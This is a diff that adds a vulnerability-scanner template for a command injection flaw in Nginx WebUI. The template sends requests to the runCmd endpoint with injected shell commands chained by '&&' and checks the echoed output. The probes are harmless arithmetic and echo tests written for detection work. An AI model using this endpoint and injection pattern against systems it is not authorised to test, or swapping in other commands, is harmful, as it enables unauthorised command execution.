@@ -1,0 +1,72 @@
+id: nginxwebui-command-injection
+
+info:
+  name: Nginx WebUI Command Injection
+  author: xiao.xiao
+  severity: critical
+  description: |
+    Template to detect command injection vulnerability in Nginx WebUI.
+  reference:
+    - https://zone.huoxian.cn/d/1210-nginx
+
+variables:
+  s1: "{{rand_int(100000000, 200000000)}}"
+  s2: "{{rand_int(10000, 20000)}}"
+  s3: "{{concat('nginx_', rand_text_alpha(5))}}"
+
+http:
+  - id: detect-command-injection-1
+    method: GET
+    path:
+      - '{{BaseURL}}/AdminPage/conf/runCmd?cmd=expr%20{{s1}}%20-%20{{s2}}%26%26echo%20nginx'
+    stop-at-first-match: true
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{to_string(to_number(s1) - to_number(s2))}}"
+          - "运行失败"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+  - id: detect-command-injection-2
+    method: GET
+    path:
+      - '{{BaseURL}}/AdminPage/conf/runCmd?cmd=echo%20{{s3}}'
+    stop-at-first-match: true
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{s3}}"
+          - "运行成功"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+  - id: detect-nginxwebui
+    method: GET
+    path:
+      - '{{BaseURL}}/aDminPage/about'
+    stop-at-first-match: true
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<title>nginxWebUI</title>"
+      - type: word
+        part: header
+        words:
+          - "text/html"
